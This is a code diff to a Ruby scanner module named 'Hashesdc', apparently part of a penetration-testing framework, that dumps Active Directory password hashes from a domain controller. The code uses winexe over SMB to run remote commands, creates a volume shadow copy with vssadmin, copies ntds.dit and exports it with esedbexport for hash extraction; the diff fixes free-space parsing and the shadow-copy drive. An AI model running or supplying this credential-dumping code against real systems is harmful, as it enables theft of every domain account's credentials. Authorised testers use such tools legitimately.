@@ -122,13 +122,13 @@ class Hashesdc < Poet::Scanner
 
 				space = winexe(smboptions, "CMD /C dir #{@ntds_drive}#{@ntds}\\ntds.dit")
 
-				free = /Dir\(s\)\s+([0-9,]+)\sbytes free/m.match(space)[1]
-				file_size = /File\(s\)\s+([0-9,]+)\s+bytes/m.match(space)[1]
-				file_size = file_size.gsub!(/,/, '')
-				if free.gsub!(/,/, '').to_i > file_size.to_i
+				free = /Dir\(s\)\s+([0-9,\.]+)\sbytes free/m.match(space)[1]
+				file_size = /File\(s\)\s+([0-9,\.]+)\s+bytes/m.match(space)[1]
+				file_size = file_size.gsub!(/[,\.]/, '')
+				if free.gsub!(/[,\.]/, '').to_i > file_size.to_i
 
 					# Create Shadow copy
-					vss_create = winexe(smboptions, "CMD /C vssadmin create shadow /for=C:")
+					vss_create = winexe(smboptions, "CMD /C vssadmin create shadow /for=#{@ntds_drive}")
 					print_status("Creating shadow copy...")
 
 					# Check if created, get volume name and copy the ntds.dit
@@ -211,12 +211,14 @@ class Hashesdc < Poet::Scanner
 							# Cleanup and return if there was a failure
 							return nil if cleanup
 
+							print_status("Exporting NTDS file contents, this might take a while...")
+
 							esedump_cmd = "#{Menu.extbin[:esedbexport]} -l #{@log}/hashes/#{host}/esedbexport.log -t #{local_drop}/ntds.dit #{local_drop}/#{ntds_filename}"
 							esedump = log(esedump_cmd) { `#{esedump_cmd}` }
 
 							# If export worked
 							if esedump =~ /Export completed\./
-								print_status("parsing ntds.dit file, this might take a while...")
+								print_status("Parsing ntds.dit file...")
 
 								# Get filenames
 								datatable = /Exporting table (\d) \(datatable\) out of \d+\./.match(esedump)[1]
